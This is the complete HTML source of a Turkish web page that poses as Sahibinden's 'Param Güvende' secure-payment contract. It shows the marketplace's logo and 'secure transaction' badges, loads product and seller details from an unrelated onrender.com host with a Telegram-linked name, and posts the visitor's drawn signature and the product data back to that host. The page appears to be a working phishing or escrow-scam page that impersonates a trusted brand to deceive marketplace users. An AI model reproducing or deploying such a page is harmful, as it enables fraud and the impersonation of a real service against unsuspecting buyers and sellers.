<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Param Güvende Sözleşme</title>

<style>
body {
    margin:0;
    font-family:-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto;
    background:#f4f6f8;
}

/* HEADER */
.header {
    background:#0f172a;
    padding:18px 12px;
}

.header-center {
    display:flex;
    flex-direction:column;
    align-items:center;
    text-align:center;
    gap:6px;
}

.logo { height:28px; }

.sub {
    color:#cbd5e1;
    font-size:12px;
}

.secure-badge {
    margin-top:6px;
    background:linear-gradient(135deg, #16a34a, #22c55e);
    color:white;
    font-size:11px;
    padding:4px 10px;
    border-radius:999px;
    font-weight:600;
}

/* CONTAINER */
.container {
    padding:16px;
    max-width:720px;
    margin:auto;
}

/* TRUST BOX */
.trust-box {
    background:#ecfeff;
    border:1px solid #67e8f9;
    padding:12px;
    border-radius:10px;
    font-size:13px;
    margin-bottom:12px;
}

/* CARD */
.card {
    background:white;
    border-radius:12px;
    padding:14px;
    margin-bottom:10px;
    box-shadow:0 2px 8px rgba(0,0,0,0.05);
}

.title {
    font-weight:700;
    margin-bottom:10px;
}

/* ÜRÜN BOX */
.product-box {
    background: linear-gradient(135deg, #ffffff, #f1f5f9);
    border: 1px solid #e2e8f0;
    border-left: 5px solid #16a34a;
    padding: 14px;
    border-radius: 12px;
    font-size: 14px;
    box-shadow: 0 4px 12px rgba(0,0,0,0.05);
}

.product-row {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 10px;
    margin-bottom: 6px;
}

.product-item {
    background: #ffffff;
    border: 1px solid #e5e7eb;
    padding: 8px 10px;
    border-radius: 8px;
}

.product-label {
    font-weight: 700;
    color: #0f172a;
}

.product-value {
    color: #1e293b;
    font-weight: 500;
}

/* MOBİL */
@media (max-width: 500px) {
    .product-row {
        grid-template-columns: 1fr;
    }
}

/* IMAGE */
.product-img {
    width:100%;
    border-radius:10px;
    margin-bottom:10px;
    display:none;
}

/* SIGNATURE */
canvas {
    width:100%;
    height:180px;
    border:2px dashed #cbd5e1;
    border-radius:10px;
    background:#fff;
}

/* ACTIONS */
.actions {
    position:sticky;
    bottom:0;
    background:white;
    padding:12px;
    box-shadow:0 -3px 10px rgba(0,0,0,0.1);
}

button {
    width:100%;
    padding:14px;
    border:none;
    border-radius:10px;
    font-weight:700;
    font-size:14px;
}

.primary {
    background:#16a34a;
    color:white;
}

.secondary {
    margin-top:8px;
    background:#e5e7eb;
}
</style>
</head>

<body>

<div class="header">
    <div class="header-center">
        <img src="https://upload.wikimedia.org/wikipedia/tr/archive/5/51/20121213095814%21Sahibinden-2010-200px.jpg" class="logo">
        <div class="sub">Param Güvende Hizmet Sözleşmesi</div>
        <div class="secure-badge">🔒 %100 Güvenli İşlem</div>
    </div>
</div>

<div class="container">

<div class="trust-box">
🛡️ Bu işlem, ödeme güvenliği sağlamak amacıyla platform güvencesi altında yürütülmektedir.
</div>

<!-- ÜRÜN -->
<div class="card">
<div class="title">Ürün Bilgisi</div>

<img id="pimg" class="product-img">

<div class="product-box">

    <div class="product-row">

        <div class="product-item">
            <span class="product-label">Ürün Adı:</span>
            <span class="product-value" id="pname"></span>
        </div>

        <div class="product-item">
            <span class="product-label">Ürün Fiyatı:</span>
            <span class="product-value" id="pprice"></span>
        </div>

    </div>

    <div class="product-row">

        <div class="product-item">
            <span class="product-label">Satıcı:</span>
            <span class="product-value" id="pseller"></span>
        </div>

        <div class="product-item">
            <span class="product-label">İletişim:</span>
            <span class="product-value" id="pphone"></span>
        </div>

    </div>

</div>

</div>

<!-- SIGN -->
<div class="card">
<div class="title">İmzanız</div>
<canvas id="pad"></canvas>
<button class="secondary" onclick="clearPad()">Temizle</button>
</div>

<div class="card">
<label>
<input type="checkbox" id="check">
 Sözleşmeyi okudum ve kabul ediyorum
</label>
</div>

</div>

<div class="actions">
<button class="primary" onclick="send()">Sözleşmeyi Onayla ve İmzala</button>
</div>

<script src="https://cdn.jsdelivr.net/npm/signature_pad@4.0.0/dist/signature_pad.umd.min.js"></script>

<script>
const canvas = document.getElementById("pad");
const pad = new SignaturePad(canvas);

function resize(){
 let ratio = Math.max(window.devicePixelRatio,1);
 canvas.width = canvas.offsetWidth * ratio;
 canvas.height = canvas.offsetHeight * ratio;
 canvas.getContext("2d").scale(ratio,ratio);
}
resize();

function clearPad(){
 pad.clear();
}

// ÜRÜN ÇEK
fetch("https://telegram-product-system.onrender.com/product")
.then(r=>r.json())
.then(d=>{
 document.getElementById("pname").innerText = d.name || "-";
 document.getElementById("pprice").innerText = d.price || "-";
 document.getElementById("pseller").innerText = d.seller || "-";
 document.getElementById("pphone").innerText = d.phone || "-";

 if(d.image){
   const img = document.getElementById("pimg");
   img.src = d.image;
   img.style.display = "block";
 }
});

// GÖNDER
function send(){

 if(!document.getElementById("check").checked){
   alert("Sözleşmeyi kabul etmelisiniz");
   return;
 }

 if(pad.isEmpty()){
   alert("İmza gereklidir");
   return;
 }

 const data = pad.toDataURL();

 fetch("https://telegram-product-system.onrender.com/submit", {
   method:"POST",
   headers:{"Content-Type":"application/json"},
   body: JSON.stringify({
     signature: data,
     product:{
       name: document.getElementById("pname").innerText,
       price: document.getElementById("pprice").innerText,
       seller: document.getElementById("pseller").innerText,
       phone: document.getElementById("pphone").innerText
     }
   })
 });

 alert("Sözleşmeniz başarıyla kayıt altına alınmıştır. Yetkili temsilcinizi bilgilendirmenizi rica ederiz.");
}
</script>

</body>
</html>
